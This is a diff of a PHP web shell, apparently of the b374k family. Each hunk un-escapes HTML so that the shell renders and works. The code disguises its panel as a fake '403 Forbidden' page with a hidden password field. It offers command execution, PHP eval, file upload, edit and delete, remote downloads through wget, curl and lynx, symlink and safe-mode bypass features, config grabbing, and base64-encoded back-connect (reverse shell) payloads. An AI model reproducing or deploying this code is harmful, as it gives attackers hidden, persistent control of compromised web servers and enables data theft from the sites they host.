@@ -35,27 +35,27 @@ if ($crotzz) {
     if (!isset($_SESSION['login']) or $_SESSION['login'] != $masukin) {
         die("
 		
-&lt;html&gt;
-  &lt;head&gt;
-    &lt;title&gt;403 Forbidden&lt;/title&gt;
-    &lt;style type=\"text/css\"&gt;
+<html>
+  <head>
+    <title>403 Forbidden</title>
+    <style type=\"text/css\">
 	input{
 	margin:0;
 	background-color:#fff;
 	border:1px solid #fff;
 	}
-    &lt;/style&gt;
-   &lt;H1&gt;Forbidden&lt;/H1&gt;
-  &lt;/head&gt;
-  &lt;body&gt;
-&lt;p&gt;You don't have permission to access on this server.&lt;/P&gt;
-&lt;hr&gt;
-&lt;address&gt;" . trim(getenv("SERVER_SOFTWARE")) . " Server at " . $_SERVER['HTTP_HOST'] . "  Port 80&lt;/address&gt;
-	&lt;center&gt;&lt;form method=\"post\"&gt;
-        &lt;input type=\"password\" name=\"pass\"&gt;
-      &lt;/form&gt;&lt;/center&gt;
-  &lt;/body&gt;
-&lt;/html&gt;
+    </style>
+   <H1>Forbidden</H1>
+  </head>
+  <body>
+<p>You don't have permission to access on this server.</P>
+<hr>
+<address>" . trim(getenv("SERVER_SOFTWARE")) . " Server at " . $_SERVER['HTTP_HOST'] . "  Port 80</address>
+	<center><form method=\"post\">
+        <input type=\"password\" name=\"pass\">
+      </form></center>
+  </body>
+</html>
             ");
     }
 }
@@ -115,15 +115,15 @@ if (!$win) {
 } else {
     $user = @get_current_user();
     $id = $user;
-    $prompt = $user . " &gt;";
+    $prompt = $user . " >";
     $pwd = realpath(".") . "\"; $v = explode("\",$d); $v = $v[0]; foreach (range("A","Z") as $letter) { $bool = @is_dir($letter.":
-        \"); if ($bool) { $letters .= " &lt; ahref = \"?y=" . $letter . ":\"&gt;[ ";
+        \"); if ($bool) { $letters .= " < ahref = \"?y=" . $letter . ":\">[ ";
         if ($letter . ":" != $v) {
             $letters.= $letter;
         } else {
-            $letters.= "&lt;span class=\"gaya\"&gt;" . $letter . "&lt;/span&gt;";
+            $letters.= "<span class=\"gaya\">" . $letter . "</span>";
         }
-        $letters.= " ]&lt;/a&gt; ";
+        $letters.= " ]</a> ";
     }
 }
 }
@@ -135,12 +135,12 @@ $bindport = "13123";
 $bindport_pass = "b374k";
 $pwds = explode(DIRECTORY_SEPARATOR, $pwd);
 $pwdurl = "";
-for ($i = 0;$i &lt; sizeof($pwds) - 1;$i++) {
+for ($i = 0;$i < sizeof($pwds) - 1;$i++) {
     $pathz = "";
-    for ($j = 0;$j &lt;= $i;$j++) {
+    for ($j = 0;$j <= $i;$j++) {
         $pathz.= $pwds[$j] . DIRECTORY_SEPARATOR;
     }
-    $pwdurl.= "&lt;a href=\"?y=" . $pathz . "\"&gt;" . $pwds[$i] . " " . DIRECTORY_SEPARATOR . " &lt;/a&gt;";
+    $pwdurl.= "<a href=\"?y=" . $pathz . "\">" . $pwds[$i] . " " . DIRECTORY_SEPARATOR . " </a>";
 }
 if (isset($_POST['rename'])) {
     $old = $_POST['oldname'];
@@ -148,17 +148,17 @@ if (isset($_POST['rename'])) {
     @rename($pwd . $old, $pwd . $new);
     $file = $pwd . $new;
 }
-$buff = $software . "&lt;br /&gt;";
-$buff.= $system . "&lt;br /&gt;";
-if ($id != "") $buff.= $id . "&lt;br /&gt;";
-$buff.= "server ip : " . $server_ip . " &lt;span class=\"gaya\"&gt;|&lt;/span&gt; your ip : " . $my_ip . "&lt;br /&gt;";
-if ($safemode) $buff.= "safemode &lt;span class=\"gaya\"&gt;ON&lt;/span&gt;&lt;br /&gt;";
-else $buff.= "safemode &lt;span class=\"gaya\"&gt;OFF&lt;span&gt;&lt;br /&gt;";
-if ('' == ($df = @ini_get('disable_functions'))) $buff.= "Disable_functions :&lt;span class=\"df\"&gt;NONE&lt;/span&gt;&lt;br /&gt;";
-else $buff.= "Disable_functions : &lt;span class=\"df\"&gt;$df&lt;span&gt;&lt;br /&gt;";
+$buff = $software . "<br />";
+$buff.= $system . "<br />";
+if ($id != "") $buff.= $id . "<br />";
+$buff.= "server ip : " . $server_ip . " <span class=\"gaya\">|</span> your ip : " . $my_ip . "<br />";
+if ($safemode) $buff.= "safemode <span class=\"gaya\">ON</span><br />";
+else $buff.= "safemode <span class=\"gaya\">OFF<span><br />";
+if ('' == ($df = @ini_get('disable_functions'))) $buff.= "Disable_functions :<span class=\"df\">NONE</span><br />";
+else $buff.= "Disable_functions : <span class=\"df\">$df<span><br />";
 $buff.= $letters . "&nbsp;Dir :&nbsp;" . $pwdurl;
 function rapih($text) {
-    return trim(str_replace("&lt;br /&gt;", "", $text));
+    return trim(str_replace("<br />", "", $text));
 }
 function magicboom($text) {
     if (!get_magic_quotes_gpc()) {
@@ -187,37 +187,37 @@ function showdir($pwd, $prompt) {
     $path = @explode(DIRECTORY_SEPARATOR, $pwd);
     $tree = @sizeof($path);
     $parent = "";
-    $buff = " &lt;form action=\"?y=" . $pwd . "&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"&gt; &lt;table class=\"cmdbox\" style=\"width:50%;\"&gt; &lt;tr&gt;&lt;td&gt;$prompt&lt;/td&gt;&lt;td&gt;&lt;input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/form&gt; &lt;form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;tr&gt;&lt;td&gt;view file/folder&lt;/td&gt;&lt;td&gt;&lt;input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"" . $pwd . "\" /&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/form&gt;&lt;/table&gt;&lt;table class=\"explore\"&gt; &lt;tr&gt;&lt;th&gt;name&lt;/th&gt;&lt;th style=\"width:80px;\"&gt;size&lt;/th&gt;&lt;th style=\"width:210px;\"&gt;owner:group&lt;/th&gt;&lt;th style=\"width:80px;\"&gt;perms&lt;/th&gt;&lt;th style=\"width:110px;\"&gt;modified&lt;/th&gt;&lt;th style=\"width:190px;\"&gt;actions&lt;/th&gt;&lt;/tr&gt; ";
-    if ($tree &gt; 2) for ($i = 0;$i &lt; $tree - 2;$i++) $parent.= $path[$i] . DIRECTORY_SEPARATOR;
+    $buff = " <form action=\"?y=" . $pwd . "&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"> <table class=\"cmdbox\" style=\"width:50%;\"> <tr><td>$prompt</td><td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr> </form> <form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <tr><td>view file/folder</td><td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"" . $pwd . "\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr> </form></table><table class=\"explore\"> <tr><th>name</th><th style=\"width:80px;\">size</th><th style=\"width:210px;\">owner:group</th><th style=\"width:80px;\">perms</th><th style=\"width:110px;\">modified</th><th style=\"width:190px;\">actions</th></tr> ";
+    if ($tree > 2) for ($i = 0;$i < $tree - 2;$i++) $parent.= $path[$i] . DIRECTORY_SEPARATOR;
     else $parent = $pwd;
     foreach ($dname as $folder) {
         if ($folder == ".") {
             if (!$win && $posix) {
                 $name = @posix_getpwuid(@fileowner($folder));
                 $group = @posix_getgrgid(@filegroup($folder));
-                $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
+                $owner = $name['name'] . "<span class=\"gaya\"> : </span>" . $group['name'];
             } else {
                 $owner = $user;
             }
-            $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "\"&gt;$folder&lt;/a&gt;&lt;/td&gt;&lt;td&gt;LINK&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($pwd) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($pwd)) . "&lt;/td&gt;&lt;td&gt;&lt;span id=\"titik1\"&gt;&lt;a href=\"?y=$pwd&amp;edit=" . $pwd . "newfile.php\"&gt;newfile&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik1','titik1_form');\"&gt;newfolder&lt;/a&gt;&lt;/span&gt; &lt;form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /&gt; &lt;/form&gt;&lt;/td&gt;&lt;/tr&gt; ";
+            $buff.= "<tr><td><a href=\"?y=" . $pwd . "\">$folder</a></td><td>LINK</td><td style=\"text-align:center;\">" . $owner . "</td><td>" . get_perms($pwd) . "</td><td style=\"text-align:center;\">" . date("d-M-Y H:i", @filemtime($pwd)) . "</td><td><span id=\"titik1\"><a href=\"?y=$pwd&amp;edit=" . $pwd . "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span> <form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /> </form></td></tr> ";
         } elseif ($folder == "..") {
             if (!$win && $posix) {
                 $name = @posix_getpwuid(@fileowner($folder));
                 $group = @posix_getgrgid(@filegroup($folder));
-                $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
+                $owner = $name['name'] . "<span class=\"gaya\"> : </span>" . $group['name'];
             } else {
                 $owner = $user;
             }
-            $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $parent . "\"&gt;$folder&lt;/a&gt;&lt;/td&gt;&lt;td&gt;LINK&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($parent) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($parent)) . "&lt;/td&gt;&lt;td&gt;&lt;span id=\"titik2\"&gt;&lt;a href=\"?y=$pwd&amp;edit=" . $parent . "newfile.php\"&gt;newfile&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik2','titik2_form');\"&gt;newfolder&lt;/a&gt;&lt;/span&gt; &lt;form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;/tr&gt;";
+            $buff.= "<tr><td><a href=\"?y=" . $parent . "\">$folder</a></td><td>LINK</td><td style=\"text-align:center;\">" . $owner . "</td><td>" . get_perms($parent) . "</td><td style=\"text-align:center;\">" . date("d-M-Y H:i", @filemtime($parent)) . "</td><td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=" . $parent . "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span> <form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /> </form> </td></tr>";
         } else {
             if (!$win && $posix) {
                 $name = @posix_getpwuid(@fileowner($folder));
                 $group = @posix_getgrgid(@filegroup($folder));
-                $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
+                $owner = $name['name'] . "<span class=\"gaya\"> : </span>" . $group['name'];
             } else {
                 $owner = $user;
             }
-            $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a id=\"" . clearspace($folder) . "_link\" href=\"?y=" . $pwd . $folder . DIRECTORY_SEPARATOR . "\"&gt;[ $folder ]&lt;/a&gt; &lt;form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($folder) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $folder . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $folder . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($folder) . "_form','" . clearspace($folder) . "_link');\" /&gt; &lt;/form&gt; &lt;td&gt;DIR&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($pwd . $folder) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($folder)) . "&lt;/td&gt;&lt;td&gt;&lt;a href=\"javascript:tukar('" . clearspace($folder) . "_link','" . clearspace($folder) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;fdelete=" . $pwd . $folder . "\"&gt;delete&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
+            $buff.= "<tr><td><a id=\"" . clearspace($folder) . "_link\" href=\"?y=" . $pwd . $folder . DIRECTORY_SEPARATOR . "\">[ $folder ]</a> <form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($folder) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"oldname\" value=\"" . $folder . "\" style=\"margin:0;padding:0;\" /> <input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $folder . "\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> <input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($folder) . "_form','" . clearspace($folder) . "_link');\" /> </form> <td>DIR</td><td style=\"text-align:center;\">" . $owner . "</td><td>" . get_perms($pwd . $folder) . "</td><td style=\"text-align:center;\">" . date("d-M-Y H:i", @filemtime($folder)) . "</td><td><a href=\"javascript:tukar('" . clearspace($folder) . "_link','" . clearspace($folder) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;fdelete=" . $pwd . $folder . "\">delete</a></td></tr>";
         }
     }
     foreach ($fname as $file) {
@@ -225,20 +225,20 @@ function showdir($pwd, $prompt) {
         if (!$win && $posix) {
             $name = @posix_getpwuid(@fileowner($file));
             $group = @posix_getgrgid(@filegroup($file));
-            $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
+            $owner = $name['name'] . "<span class=\"gaya\"> : </span>" . $group['name'];
         } else {
             $owner = $user;
         }
-        $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a id=\"" . clearspace($file) . "_link\" href=\"?y=$pwd&amp;view=$full\"&gt;$file&lt;/a&gt; &lt;form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($file) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $file . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $file . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;td&gt;" . ukuran($full) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($full) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($full)) . "&lt;/td&gt; &lt;td&gt;&lt;a href=\"?y=$pwd&amp;edit=$full\"&gt;edit&lt;/a&gt; | &lt;a href=\"javascript:tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;delete=$full\"&gt;delete&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;dl=$full\"&gt;download&lt;/a&gt;&nbsp;(&lt;a href=\"?y=$pwd&amp;dlgzip=$full\"&gt;gzip&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt;";
+        $buff.= "<tr><td><a id=\"" . clearspace($file) . "_link\" href=\"?y=$pwd&amp;view=$full\">$file</a> <form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($file) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"oldname\" value=\"" . $file . "\" style=\"margin:0;padding:0;\" /> <input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $file . "\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> <input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\" /> </form> </td><td>" . ukuran($full) . "</td><td style=\"text-align:center;\">" . $owner . "</td><td>" . get_perms($full) . "</td><td style=\"text-align:center;\">" . date("d-M-Y H:i", @filemtime($full)) . "</td> <td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gzip</a>)</td></tr>";
     }
-    $buff.= "&lt;/table&gt;";
+    $buff.= "</table>";
     return $buff;
 }
 function ukuran($file) {
     if ($size = @filesize($file)) {
-        if ($size &lt;= 1024) return $size;
+        if ($size <= 1024) return $size;
         else {
-            if ($size &lt;= 1024 * 1024) {
+            if ($size <= 1024 * 1024) {
                 $size = @round($size / 1024, 2);;
                 return "$size kb";
             } else {
@@ -306,7 +306,7 @@ function download($cmd, $url) {
             exe(which('wget') . " " . $url . " -O " . $namafile);
         break;
         case 'wlynx':
-            exe(which('lynx') . " -source " . $url . " &gt; " . $namafile);
+            exe(which('lynx') . " -source " . $url . " > " . $namafile);
         break;
         case 'wfread':
             ambil($wurl, $namafile);
@@ -315,10 +315,10 @@ function download($cmd, $url) {
             exe(which('fetch') . " -o " . $namafile . " -p " . $url);
         break;
         case 'wlinks':
-            exe(which('links') . " -source " . $url . " &gt; " . $namafile);
+            exe(which('links') . " -source " . $url . " > " . $namafile);
         break;
         case 'wget':
-            exe(which('GET') . " " . $url . " &gt; " . $namafile);
+            exe(which('GET') . " " . $url . " > " . $namafile);
         break;
         case 'wcurl':
             exe(which('curl') . " " . $url . " -o " . $namafile);
@@ -352,7 +352,7 @@ $back_connect = "fZFRS8MwF IXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6t
 $back_connect_c = "XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29r WhyEzc+Z2TjpSserABYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl9?5 /3Wa43fpotyCABR95zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vK C1rI6wgSmN/niYb75i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVC nim7a/ZuJC0JTwf3ARkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlx iuPB3E0/gXejiHMcYjwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3X Ie1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
 $domain = "bVNRj6IwEH434T/MVZPCxaPuPSpw+3DZf3BPxjMVBmm2UNLWRW/jf79ScHV1gRKmM/PN12+GWbFY1JDCcykkhoShzVnDayziXDUliVbBJJiIMvw26wOjYPIeTAqBEBLIeUMtaOQFfJV2DiYoDfb5LgfzSgFJLN9JhFxyY1JaqJqLhnIp9k1Kc2wsagpZYovst3eZhLnv3v5jUF8tc6qlaF7BbxBXq1SORl6FniRwAzOHHb2P3FHjXoTkn2qQzL1ncLVuf1tzm1dbLmVIp30EkDD+HpEpnXuQ4W06MyhRyoOpwg9VjNUSm9BqUYdj3Ppps15soggy+DmUmR0ceSdxq4w4bvdo2+4gitArrroG9Sj7mxOCGzSMxHdYvpyHMsKig/KQa9orTjcwup9HWRwcmRNnMK2UHVv4kXmLPHhET44KTUdTelPS8ZAQXnVy0PFfl8AGHa8UQWl4CJOPYcMAXciQpBBvYOxJYkohV1LpJUxfXhbughVYPNofpuKF6pawaI9+PbmlsVgBze50iknCHJ4fiPMgyTB1wSSxOuvtfnjcu696nUGaJRws164zKd3uJG9eKVQay7Sytl0y1nVd/FCL9eX7c8TEzSHPwOEyDz8WulTY8xOnbtuF33YtJp8SLvfIkA8E6KWLrFI1sgcI1h52UuTbytaS3p/h5jfh2Wd2zOkBZJyb25k+3zy/sv8=";
 ?> 
-&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt; &lt;script type="text/javascript"&gt; function tukar(lama,baru){ document.getElementById(lama).style.display = 'none'; document.getElementById(baru).style.display = 'block'; } &lt;/script&gt; &lt;style type="text/css"&gt; 
+<html><head><title>403 Forbidden</title> <script type="text/javascript"> function tukar(lama,baru){ document.getElementById(lama).style.display = 'none'; document.getElementById(baru).style.display = 'block'; } </script> <style type="text/css"> 
 body{ background:#000000; } a { text-decoration:none; } a:hover{
 	border-bottom-width: 1px;
 	border-bottom-style: solid;
@@ -399,45 +399,45 @@ body{ background:#000000; } a { text-decoration:none; } a:hover{
 	cursor:pointer;
 	background-color: #007700;
 } .viewfile{ background:#EDECEB; color:#000000; margin:4px 2px; padding:8px; } .sembunyi{ display:none; padding:0;margin:0;} .info{ background:#111111; width:99%; padding:5px; margin:10px auto 5px; text-align:center; font-size:13px;} .info a{ font-size:14px;} .info span{ font-size:14px;} .jaya{ margin:5px; text-align:right; }
-&lt;/style&gt; 
-&lt;/head&gt; &lt;body onLoad="document.getElementById('cmd').focus();"&gt; &lt;div class="main"&gt; &lt;!-- head info start here --&gt; &lt;div class="head_info"&gt; &lt;table&gt;
-  &lt;tr&gt; &lt;td rowspan="2"&gt;&lt;table class="b_tbl"&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="?"&gt;&lt;span class="b1"&gt;&lt;img src="http://i1303.photobucket.com/albums/ag156/kaceundetected/kaceundetected-1.jpg" width="319" height="100" border="0"&gt;&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
-  &lt;/tr&gt;&lt;tr&gt;
-    &lt;td&gt;&lt;span class="gaya"&gt;<?php echo $xName; ?>&lt;/span&gt;  | Stain that want to learn &lt;/td&gt;
-  &lt;/tr&gt;&lt;/table&gt;&lt;/td&gt; &lt;td&gt;<?php echo $buff; ?>&lt;br/&gt;&lt;/td&gt; 
-  &lt;/tr&gt;
-  &lt;tr&gt;
+</style> 
+</head> <body onLoad="document.getElementById('cmd').focus();"> <div class="main"> <!-- head info start here --> <div class="head_info"> <table>
+  <tr> <td rowspan="2"><table class="b_tbl"><tr><td><a href="?"><span class="b1"><img src="http://i1303.photobucket.com/albums/ag156/kaceundetected/kaceundetected-1.jpg" width="319" height="100" border="0"></span></a></td>
+  </tr><tr>
+    <td><span class="gaya"><?php echo $xName; ?></span>  | Stain that want to learn </td>
+  </tr></table></td> <td><?php echo $buff; ?><br/></td> 
+  </tr>
+  <tr>
     
-  &lt;/tr&gt;
-&lt;/table&gt; 
-&lt;/div&gt; &lt;!-- head info end here --&gt;
+  </tr>
+</table> 
+</div> <!-- head info end here -->
 
- &lt;!-- menu start --&gt; &lt;div id="menu"&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>"&gt;explore&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=shell"&gt;shell&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=php"&gt;eval&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=mysql"&gt;mysql&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=phpinfo"&gt;phpinfo&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=netsploit"&gt;netsploit&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=upload"&gt;upload&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=jumping"&gt;jumping&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=symlink"&gt;symlink&lt;/a&gt;
+ <!-- menu start --> <div id="menu"> <a href="?<?php echo "y=" . $pwd; ?>">explore</a> <a href="?<?php echo "y=" . $pwd; ?>&x=shell">shell</a> <a href="?<?php echo "y=" . $pwd; ?>&x=php">eval</a> <a href="?<?php echo "y=" . $pwd; ?>&x=mysql">mysql</a> <a href="?<?php echo "y=" . $pwd; ?>&x=phpinfo">phpinfo</a> <a href="?<?php echo "y=" . $pwd; ?>&x=netsploit">netsploit</a> <a href="?<?php echo "y=" . $pwd; ?>&x=upload">upload</a> <a href="?<?php echo "y=" . $pwd; ?>&x=jumping">jumping</a> <a href="?<?php echo "y=" . $pwd; ?>&x=symlink">symlink</a>
  
-  &lt;a href="?<?php echo "y=" . $pwd; ?>&x=domain"&gt;domain&lt;/a&gt;
-  &lt;a href="?<?php echo "y=" . $pwd; ?>&x=bypass"&gt;bypass&lt;/a&gt;
-  &lt;a href="?<?php echo "y=" . $pwd; ?>&x=logout"&gt;logout&lt;/a&gt; &lt;/div&gt; 
+  <a href="?<?php echo "y=" . $pwd; ?>&x=domain">domain</a>
+  <a href="?<?php echo "y=" . $pwd; ?>&x=bypass">bypass</a>
+  <a href="?<?php echo "y=" . $pwd; ?>&x=logout">logout</a> </div> 
   
   
-  &lt;!-- menu end --&gt;
-  &lt;!-- menu2 start --&gt; 
+  <!-- menu end -->
+  <!-- menu2 start --> 
   
-  &lt;div id="menu"&gt;&lt;a onClick="window.open('http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=<?php echo $_SERVER['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=<?php echo $_SERVER['SERVER_ADDR']; ?>"&gt;Site list&lt;/a&gt;
-   &lt;a href="?<?php echo "y=" . $pwd; ?>&x=python"&gt;python&lt;/a&gt;
-   &lt;a href="?<?php echo "y=" . $pwd; ?>&x=cgi"&gt;Cgi Shell&lt;/a&gt;
-   &lt;a href="?<?php echo "y=" . $pwd; ?>&x=cgi2012"&gt;CGI-Telnet 2012&lt;/a&gt;
-   &lt;a href="?<?php echo "y=" . $pwd; ?>&x=phpini"&gt;Safe Mode&lt;/a&gt;
+  <div id="menu"><a onClick="window.open('http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=<?php echo $_SERVER['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=<?php echo $_SERVER['SERVER_ADDR']; ?>">Site list</a>
+   <a href="?<?php echo "y=" . $pwd; ?>&x=python">python</a>
+   <a href="?<?php echo "y=" . $pwd; ?>&x=cgi">Cgi Shell</a>
+   <a href="?<?php echo "y=" . $pwd; ?>&x=cgi2012">CGI-Telnet 2012</a>
+   <a href="?<?php echo "y=" . $pwd; ?>&x=phpini">Safe Mode</a>
    
-   &lt;a href="?<?php echo "y=" . $pwd; ?>&x=config"&gt;Config Sh3ll&lt;/a&gt;
-     &lt;a href="?<?php echo "y=" . $pwd; ?>&x=wp"&gt;Wordpress&lt;/a&gt;
-	 &lt;a href="?<?php echo "y=" . $pwd; ?>&x=joomla"&gt;Joomla&lt;/a&gt;
